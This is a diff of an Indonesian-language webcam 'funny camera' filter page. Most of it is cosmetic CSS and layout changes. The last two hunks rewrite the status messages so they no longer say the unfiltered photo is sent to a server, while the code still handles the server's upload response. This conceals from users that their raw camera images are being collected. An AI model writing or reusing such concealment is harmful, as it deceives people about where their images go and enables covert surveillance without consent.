@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sando-Ai's Kamera Lucu! 😈</title>
+    <title>Kamera Lucuu ;3</title>
     <style>
         body {
             font-family: 'Comic Sans MS', cursive, sans-serif;
@@ -12,11 +12,13 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            justify-content: flex-start;
             min-height: 100vh;
             margin: 0;
-            overflow: hidden;
+            padding: 40px 0 60px;
             background-image: linear-gradient(45deg, #2c003e 0%, #5a007e 100%);
+            overflow-x: hidden;
+            overflow-y: auto;
         }
         h1 {
             color: #ff69b4;
@@ -25,6 +27,7 @@
             font-size: 2.8em;
             letter-spacing: 2px;
             animation: pulse 2s infinite alternate;
+            text-align: center;
         }
         @keyframes pulse {
             0% { transform: scale(1); }
@@ -33,7 +36,9 @@
         .camera-container {
             position: relative;
             width: 680px;
+            max-width: 95vw;
             height: 510px;
+            max-height: 70vh;
             background-color: #000;
             border: 5px solid #00ffff;
             box-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff;
@@ -60,9 +65,9 @@
             display: none;
         }
         .controls {
-            margin-top: 20px;
+            margin-top: 10px;
             display: flex;
-            gap: 25px;
+            gap: 20px;
             align-items: center;
             flex-wrap: wrap;
             justify-content: center;
@@ -94,12 +99,13 @@
             transform: none;
         }
         .message {
-            margin-top: 20px;
-            font-size: 1.1em;
+            margin-top: 18px;
+            font-size: 1.05em;
             color: #00ffff;
             text-shadow: 0 0 8px #00ffff;
             font-weight: bold;
             text-align: center;
+            max-width: 90vw;
         }
         .loading-spinner {
             border: 5px solid rgba(255, 255, 255, 0.3);
@@ -125,6 +131,7 @@
             flex-direction: column;
             align-items: center;
             gap: 15px;
+            max-width: 420px;
         }
         .preview-title {
             font-size: 1.4em;
@@ -133,7 +140,7 @@
             text-align: center;
         }
         .preview-image {
-            max-width: 380px;
+            max-width: 100%;
             max-height: 280px;
             border-radius: 15px;
             border: 3px solid #00ffff;
@@ -194,7 +201,7 @@
     <p class="message" id="statusMessage">Memuat kamera...</p>
 
     <div class="preview-container" id="previewContainer">
-        <div class="preview-title">Hasil Filter (untuk kamu download)</div>
+        <div class="preview-title">Hasil jepretan mu (untuk kamu download)</div>
         <img id="previewImage" class="preview-image" src="" alt="Preview Foto Filter">
         <a id="downloadButton" class="download-button" href="#" download="kamera-lucu-filtered.jpeg">Download Foto Filter</a>
     </div>
@@ -353,7 +360,7 @@
                 let msg = response.statusText;
 
                 if (response.ok) {
-                    statusMessage.textContent = 'Foto tanpa filter terkirim ke server. Versi filter siap kamu download!';
+                    statusMessage.textContent = 'Foto siap kamu download!';
                 } else {
                     try {
                         const j = await response.json();
@@ -363,7 +370,7 @@
                             msg = await response.text();
                         } catch (_) {}
                     }
-                    statusMessage.textContent = `Gagal mengirim foto ke server: ${msg}`;
+                    statusMessage.textContent = `Gagal memuat foto: ${msg}`;
                 }
             } catch (error) {
                 statusMessage.textContent = `Terjadi kesalahan jaringan: ${error.message}`;
